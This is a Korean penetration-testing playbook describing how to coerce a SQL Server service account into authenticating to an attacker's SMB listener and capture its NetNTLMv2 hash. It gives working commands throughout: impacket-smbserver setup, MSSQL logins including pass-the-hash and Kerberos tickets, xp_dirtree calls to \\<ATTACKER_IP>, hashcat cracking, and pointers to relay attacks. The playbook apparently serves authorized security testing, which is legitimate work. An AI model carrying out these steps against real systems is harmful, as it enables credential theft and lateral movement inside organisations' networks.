---
tags:
  - 환경/windows
  - 서비스/mssql
시작조건: ["MSSQL 인증과 query 실행 가능", "공격자 SMB listener로의 outbound 445 도달 가능"]
필요권한: ["MSSQL query 실행 권한"]
필요조건: ["공격자 SMB listener 접근 가능", "대상 SQL Server에서 공격자 TCP/445 outbound 가능", "UNC 경로 사용 가능"]
결과: ["SQL Server 서비스 계정의 NetNTLMv2 challenge-response", "서비스 계정 단서", "오프라인 크래킹 또는 실시간 relay 후보"]
---

# MSSQL 서비스 Hash 캡처

## 한 줄 판단

MSSQL에서 UNC 경로를 처리하는 stored procedure를 호출해 SQL Server 서비스 계정이 공격자 `impacket-smbserver`로 SMB 인증하도록 유도하고 NetNTLMv2 challenge-response를 캡처한다.

## 사용할 때

- MSSQL 로그인에는 성공했지만 `xp_cmdshell` 실행이나 활성화 권한은 부족할 때.
- SQL Server 서비스 계정의 이름, 도메인, NetNTLMv2 hash를 cracking 또는 relay 후보로 확보하고 싶을 때.
- 대상에서 공격자 SMB listener로 outbound 445 접근이 가능할 때.
- DB 내부 데이터보다 Windows/AD 쪽 후속 인증 경로가 더 중요할 때.
- 현재 보유 정보: MSSQL에 query를 실행할 수 있는 로그인 또는 통합 인증 ticket·password·hash, 공격자 listener 주소와 대상 SQL Server 후보.
- 명령 실행 위치: SQL query를 보낼 수 있고 listener TCP/445를 열 수 있는 공격 호스트. SQL Server 호스트에서도 이 listener의 주소·TCP/445에 outbound로 도달해야 한다.
- 현재 권한과 대상: SQL query 실행 또는 해당 procedure 실행 권한은 `sysadmin`, SQL Server Windows 서비스 계정의 로컬 관리자, 도메인 관리자 권한과 다르다.
- 획득 결과: listener의 `USER::DOMAIN:...`은 NetNTLMv2 challenge-response다. 평문 비밀번호, NT hash, relay 성공은 후속 분기로 별도 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|
| SQL 실행 위치와 인증 | 공격 호스트에서 대상 MSSQL에 접속하고 `SELECT SYSTEM_USER;`를 실행 가능 | `impacket-mssqlclient`, `sqlcmd`, `sqsh` | SQL 포트·인증 형식과 현재 SQL login 확인 |
| SQL 대상 procedure | 현재 SQL Server build에 실제 존재하고 호출자에게 `EXECUTE`가 허용된 `xp_dirtree`, `xp_subdirs`, `xp_fileexist` 중 하나 | `sys.system_objects`와 `HAS_PERMS_BY_NAME` | 객체 부재·metadata 비표시·권한 거부를 구분하고 확인되지 않은 procedure는 호출하지 않음 |
| 공격자 listener | 공격 호스트에서 SMB listener TCP/445를 열고 결과를 저장 가능 | `impacket-smbserver` 시작 로그 | 포트 점유, 권한, VPN 인터페이스와 로그 경로 확인 |
| SQL Server outbound 경로 | SQL Server 호스트에서 공격자 listener IP TCP/445에 도달 가능 | listener 로그, `tcpdump` | 방화벽, 라우팅, 공격자 주소와 egress 정책 확인 |
| 후속 활용 조건 | 캡처 계정과 대상 서비스가 식별되어 cracking 또는 실시간 relay 조건을 판단 가능 | 전체 NetNTLMv2 라인과 계정·도메인 출력 | hash 형식, SMB signing, EPA와 대상 서비스 ACL 분리 확인 |

## 실행

1. 공격자 호스트에서 `impacket-smbserver`를 TCP/445로 실행한다.
2. MSSQL에 접속해 현재 사용자와 권한을 확인한다.
3. SQL Server build, 설치된 system object와 호출자의 유효 `EXECUTE` 권한을 확인한다.
4. 확인된 `xp_dirtree`, `xp_subdirs`, `xp_fileexist` 중 하나로 `\\<ATTACKER_IP>\<SHARE>\` 접근을 유도한다.
5. listener에 출력된 NetNTLMv2 hash와 계정명을 저장한다.
6. hashcat cracking 또는 `ntlmrelayx` 기반 relay 가능성을 분리해서 판단한다.

### impacket-smbserver listener 준비

기존 445/TCP listener와 세 경로를 먼저 확인한다. 아래 경로 중 하나라도 이미 있거나 445/TCP가 점유되어 있으면 덮어쓰거나 기존 listener를 종료하지 말고 새 경로·별도 승인된 주소를 정한다.

```bash
test ! -e '<MSSQL_SMB_SHARE_DIRECTORY>'
test ! -e '<MSSQL_SMB_LOG>'
test ! -e '<MSSQL_HASH_FILE>'
test ! -e '<MSSQL_POTFILE>'
sudo ss -ltnp 'sport = :445'
mkdir -m 700 '<MSSQL_SMB_SHARE_DIRECTORY>'
```

확인할 출력:

- 네 파일·디렉터리 기준선은 모두 존재하지 않아야 한다.
- `ss`에 기존 445/TCP listener가 있으면 이번 listener를 시작하지 않는다.

### 로그를 파일로 남기며 실행

전경 명령을 실행한 exact terminal을 기록한다. 시작 뒤 다른 공격 호스트 terminal에서 `sudo ss -ltnp 'sport = :445'`를 실행해 listener PID와 command line을 `<MSSQL_SMB_LISTENER_PID>`로 기록한다.

```bash
sudo impacket-smbserver capture '<MSSQL_SMB_SHARE_DIRECTORY>' -smb2support -debug 2>&1 | tee '<MSSQL_SMB_LOG>'
```

확인할 출력:

- TCP/445에서 이번 `impacket-smbserver` PID가 대기한다.
- `-smb2support`로 최신 Windows 클라이언트의 SMB2 연결을 받는다.
- hash 라인과 접속 IP를 listener 종료 후에도 다시 확인할 수 있다.
- NetNTLMv2 challenge-response 라인은 보통 `USER::DOMAIN:` 형태로 남는다.
- 445 바인딩에 실패하면 권한, 기존 listener와 bind 인터페이스를 먼저 확인한다.

### MSSQL 인증 방식 선택

이 단계의 `<SQL_REQUESTER>`는 SQL query를 실행할 로그인이다. 이후 listener에서 캡처되는 `<SERVICE_ACCOUNT>`는 SQL Server 프로세스를 실행하는 Windows 계정이므로 두 주체를 같은 계정으로 해석하지 않는다.

| 보유한 인증 수단 | 사용할 방식 | 성공 시 확인하는 주체 |
|---|---|---|
| SQL login의 평문 비밀번호 | SQL 인증 | `SYSTEM_USER`에 표시된 SQL login |
| Windows 계정의 평문 비밀번호 | Windows 통합 인증 | `SYSTEM_USER`에 표시된 Windows Identity |
| Windows 계정의 NT hash | Windows 통합 인증의 Pass-the-Hash | NT hash가 속한 Windows Identity |
| Windows 계정의 유효한 TGT 또는 MSSQL service ticket이 담긴 ccache | Kerberos 통합 인증 | ccache principal과 MSSQL SPN에 매핑된 Windows Identity |

#### 1. SQL login의 평문 비밀번호

```bash
impacket-mssqlclient '<SQL_REQUESTER>:<SQL_PASSWORD>@<TARGET>'
```

#### 2. Windows 계정의 평문 비밀번호

```bash
impacket-mssqlclient '<DOMAIN>/<SQL_REQUESTER>:<PASSWORD>@<TARGET>' -windows-auth
```

#### 3. Windows 계정의 NT hash

```bash
impacket-mssqlclient '<DOMAIN>/<SQL_REQUESTER>@<TARGET>' -windows-auth -hashes :<NT_HASH>
```

`<NT_HASH>`는 MSSQL에 접속할 `<SQL_REQUESTER>`의 NT hash다. listener에서 나중에 수집되는 SQL Server 서비스 계정의 NetNTLMv2 challenge-response와는 형식과 주체가 모두 다르다.

#### 4. Windows 계정의 Kerberos ccache

```bash
export KRB5CCNAME=<CCACHE_FILE>
klist
impacket-mssqlclient -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<SQL_REQUESTER>@<MSSQL_FQDN>'
```

`-no-pass`는 익명 SQL 연결이 아니다. `KRB5CCNAME`의 ticket으로 `<SQL_REQUESTER>`를 인증하며 MSSQL SPN과 일치시키기 위해 IP보다 `<MSSQL_FQDN>`을 사용한다.

### 현재 SQL login과 기본 권한 확인

```sql
SELECT SYSTEM_USER;
SELECT ORIGINAL_LOGIN();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

확인할 출력:

- 현재 SQL login과 sysadmin 여부.
- 이 기법은 sysadmin이 없어도 `xp_dirtree` 계열 procedure 실행이 가능하면 시도할 수 있다.
- `Login failed`는 선택한 SQL/Windows 인증 방식, 요청자 계정과 서버 인증 설정을 확인한다. 로그인 성공 뒤 procedure가 거부되면 요청자 인증과 query 권한을 분리한다.

### SQL Server build·procedure·권한 확인

Microsoft는 `xp_dirtree`, `xp_subdirs`, `xp_fileexist` 각각의 버전·platform별 동작을 보장하는 전용 reference를 제공하지 않는다. 따라서 이름이 알려져 있다는 이유로 존재나 동일한 signature를 가정하지 않고, 현재 instance에서 read-only metadata를 먼저 확인한다.

```sql
USE master;
SELECT @@VERSION AS version_and_platform,
       CAST(SERVERPROPERTY('ProductVersion') AS nvarchar(128)) AS product_version,
       CAST(SERVERPROPERTY('Edition') AS nvarchar(128)) AS edition;

SELECT name, type_desc
FROM sys.system_objects
WHERE name IN (N'xp_dirtree', N'xp_subdirs', N'xp_fileexist');

SELECT HAS_PERMS_BY_NAME(N'sys.xp_dirtree', N'OBJECT', N'EXECUTE') AS can_xp_dirtree,
       HAS_PERMS_BY_NAME(N'sys.xp_subdirs', N'OBJECT', N'EXECUTE') AS can_xp_subdirs,
       HAS_PERMS_BY_NAME(N'sys.xp_fileexist', N'OBJECT', N'EXECUTE') AS can_xp_fileexist;
```

확인할 출력:

- `sys.system_objects`에서 이름과 `type_desc`가 보이면 현재 `master` database에 해당 system object가 보이는 것이다. catalog view의 metadata visibility가 권한에 따라 제한되므로 행이 없다는 결과만으로 모든 build에 객체가 없다고 일반화하지 않는다.
- `HAS_PERMS_BY_NAME`의 `1`은 현재 호출 context의 유효 `EXECUTE` 권한, `0`은 권한 없음, `NULL`은 query 실패나 유효하지 않은 securable class·permission을 뜻한다. 이 값은 UNC 처리 성공이나 outbound TCP/445 도달성을 확인하지 않는다.
- 현재 build에서 확인된 객체와 `EXECUTE = 1`인 후보 하나만 다음 단계에서 사용한다. 나머지를 연속 호출해 불필요한 인증 시도를 만들지 않는다.

### MSSQL에서 인증 유도

```sql
-- 위 확인에서 존재와 EXECUTE 권한을 확인한 하나만 선택한다.
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\';
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\';
EXEC master..xp_fileexist '\\<ATTACKER_IP>\share\probe.txt';
```

확인할 출력:

- `impacket-smbserver` 터미널에 SQL Server에서 들어온 SMB 연결이 보인다.
- `AUTHENTICATE_MESSAGE`와 `DOMAIN\USER` 또는 `DOMAIN\HOST$`가 출력된다.
- `USER::DOMAIN:<challenge>:<response>:...` 형식의 NetNTLMv2 hash가 출력된다.
- SQL query가 오류를 반환해도 이 listener 출력이 있으면 인증 수집은 성공한 것이다. 반대로 SQL 성공 메시지만으로 capture를 판정하지 않는다.

### 캡처 hash cracking

listener 로그에서 이번 SQL Server 연결에 해당하는 완전한 NetNTLMv2 한 줄만 기존에 없던 `<MSSQL_HASH_FILE>`로 분리한다. 전용 potfile을 사용해 다른 cracking 작업의 cache와 섞지 않는다.

```bash
hashcat -m 5600 -a 0 '<MSSQL_HASH_FILE>' '<WORDLIST>' --potfile-path '<MSSQL_POTFILE>' --backend-ignore-opencl -d 1 -O -w 3
hashcat --show -m 5600 '<MSSQL_HASH_FILE>' --potfile-path '<MSSQL_POTFILE>' --backend-ignore-opencl -d 1 -O -w 3
```

확인할 출력:

- NetNTLMv2는 Hashcat mode `5600`을 사용한다.
- 평문 비밀번호가 복구되면 MSSQL, SMB, WinRM, LDAP 등에서 재사용 가능성을 확인한다.

## 변경 영향과 복구

1. MSSQL query와 hash 수집을 중단하고 SQL client를 정상 종료한다. cracking이 실행 중이면 그 terminal·PID의 Hashcat만 먼저 종료한다.
2. listener를 실행한 exact terminal에서 `Ctrl-C`로 전경 pipeline을 종료한다. 다른 terminal에서 `ps -p <MSSQL_SMB_LISTENER_PID> -o pid=,args=`와 `sudo ss -ltnp 'sport = :445'`를 실행해 이번 PID가 끝나고 포트가 작업 전 상태로 돌아왔는지 확인한다.
3. `find '<MSSQL_SMB_SHARE_DIRECTORY>' -mindepth 1 -maxdepth 1 -print`로 share 안의 파일을 확인한다. UNC 조회만 했다면 보통 비어 있어야 하며, 비어 있을 때만 `rmdir '<MSSQL_SMB_SHARE_DIRECTORY>'`를 실행한다. 예상하지 않은 파일이 있으면 이번 작업의 파일로 단정해 삭제하지 않는다.
4. `<MSSQL_SMB_LOG>`·`<MSSQL_HASH_FILE>`·`<MSSQL_POTFILE>`은 challenge-response와 복구된 평문을 포함할 수 있다. 승인된 결과 인계 후 폐기하기로 했다면 exact 경로만 `rm -- '<MSSQL_SMB_LOG>' '<MSSQL_HASH_FILE>' '<MSSQL_POTFILE>'`로 제거하고 각각 `test ! -e`로 확인한다. 보존해야 하면 Vault가 아닌 승인된 위치와 접근 권한을 확인한다.

listener 종료가 실패하면 먼저 기록한 PID의 command line과 445/TCP 소유자를 대조하고 모든 Python·SMB process를 이름으로 종료하지 않는다. SQL Server가 보낸 인증 시도와 서버·네트워크 감사 기록, 이미 relay된 인증은 되돌릴 수 없다. hash 캡처·cracking 성공과 listener·민감 파일 정리 완료는 별도로 판정한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| MSSQL 인증과 `SELECT SYSTEM_USER` 성공 | query 실행 가능 | MSSQL 세션과 SQL Identity 확인 | procedure 실행 권한 확인 |
| listener의 `AUTHENTICATE_MESSAGE`와 `USER::DOMAIN:...` | SQL Server의 SMB 인증 유도 성공 | NetNTLMv2 hash와 계정 단서 확보 | [[오프라인 해시 크래킹]] 또는 relay 조건 검토 |
| 캡처 주체가 도메인 서비스 계정 | 도메인 계정 컨텍스트로 SQL Server 실행 | 서비스 계정 relay/cracking 후보 | SPN, 그룹, 서비스 권한 확인 |
| 캡처 주체가 `HOST$` | 머신 계정 컨텍스트로 네트워크 인증 | 머신 계정 relay 후보 | AD CS/LDAP relay와 머신 계정 권한 검토 |
| SQL 에러와 listener hash가 함께 보임 | SQL 작업 결과와 무관하게 강제 인증은 성공 | NetNTLMv2 hash 확보 | listener 출력을 기준으로 후속 진행 |
| listener 실행 실패 | TCP/445 권한 부족 또는 포트 점유 | 인증 수신 준비 실패 | `sudo`, 점유 프로세스, VPN 인터페이스 확인 |
| procedure가 metadata에 없거나 권한 확인이 `0`·`NULL` | 현재 build에서 객체가 보이지 않거나 호출 권한을 확인하지 못함 | 인증 유도 미수행 | `master` context, metadata visibility, 정확한 객체명과 현재 login 권한 확인 |
| query는 성공하지만 hash 없음 | outbound SMB 차단, IP 또는 라우팅 오류 가능 | MSSQL 접근만 유지 | `tcpdump`, VPN 주소, 방화벽 확인 |
| `EXECUTE permission was denied` | procedure 실행 권한 없음 | 강제 인증 미수행 | 다른 DB 권한, `xp_fileexist`, [[MSSQL Impersonation 권한 상승]] 검토 |
| Hashcat이 hash를 인식하지 못함 | NetNTLMv2 라인 잘림 또는 mode 오류 | 캡처 형식 불완전 | 전체 `USER::DOMAIN:...` 라인과 `-m 5600` 확인 |
| crack 실패 | 강한 서비스 계정 비밀번호 | NetNTLMv2 hash만 확보 | [[NTLM Relay 조건 검토]]와 계정 권한 평가 |

NetNTLMv2는 원본 NTLM hash가 아니므로 [[Pass the Hash]]에 바로 사용할 수 없다.

## 확인할 출력과 권한

- SQL 에러보다 listener의 원본 IP, 계정명, 도메인명과 전체 NetNTLMv2 라인을 우선 확인한다.
- MSSQL query 실행 권한과 `sysadmin`, Windows 로컬 관리자, 도메인 권한은 서로 다르다.
- 캡처한 NetNTLM challenge-response는 오프라인 비밀번호 복구 또는 relay 입력 후보이며, 평문 비밀번호·계정 NTLM hash·인증 성공을 뜻하지 않는다.

## 후속 공격 연결

- [[오프라인 해시 크래킹]]
- [[NTLM Relay 조건 검토]]
- [[AD CS ESC8 NTLM Relay]]
- [[원격 비밀번호 공격]]
- [[MSSQL Impersonation 권한 상승]]
- [[MSSQL Linked Server 내부 이동]]

## 관련 서비스

- [[MSSQL 서비스]]
- [[SMB 서비스]]

## 관련 도구

- [[impacket-mssqlclient]]
- [[impacket-smbserver]]
- [[impacket-ntlmrelayx]]
- [[Responder]]
- [[hashcat]]
- [[klist]]

## 참고 링크

- [Impacket smbserver](https://github.com/fortra/impacket/blob/master/impacket/smbserver.py)
- [Microsoft: System stored procedures](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/system-stored-procedures-transact-sql)
- [Microsoft: @@VERSION](https://learn.microsoft.com/en-us/sql/t-sql/functions/version-transact-sql)
- [Microsoft: sys.system_objects](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-system-objects-transact-sql)
- [Microsoft: HAS_PERMS_BY_NAME](https://learn.microsoft.com/en-us/sql/t-sql/functions/has-perms-by-name-transact-sql)
- [Microsoft: Programming extended stored procedures](https://learn.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming)
